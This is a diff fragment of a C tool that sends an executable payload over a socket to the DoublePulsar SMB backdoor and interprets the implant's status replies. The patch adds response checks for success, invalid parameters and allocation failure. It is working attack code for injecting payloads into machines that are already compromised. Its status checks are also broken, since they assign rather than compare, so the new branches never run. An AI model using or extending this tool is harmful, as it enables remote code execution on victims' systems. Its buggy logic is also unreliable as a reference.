@@ -468,10 +468,27 @@ int main(int argc, char* argv[])
 	send(sock, (char*)pExeBuffer, size_big_packet, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-	if(recvbuff[34] = 0x52)
+	//DoublePulsar response: STATUS_NOT_IMPLEMENTED
+	if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
+	{
+		printf("All data sent and got good response from DoublePulsar!\n");
+	}
+
+	if (recvbuff[34] = 0x52)
 	{
 		printf("Doublepulsar returned 82!\n");
 	}
+
+	else if (recvbuff[34] = 0x62)
+	{
+		printf("Doublepulsar returned: Invalid parameters!\n");
+	}
+			
+	else if (recvbuff[34] = 0x72)
+	{
+		printf("Doublepulsar returned: Allocation failure!\n");
+	}
+	
 	else {
 		printf("Doublepulsar didn't work!\n");
 	}
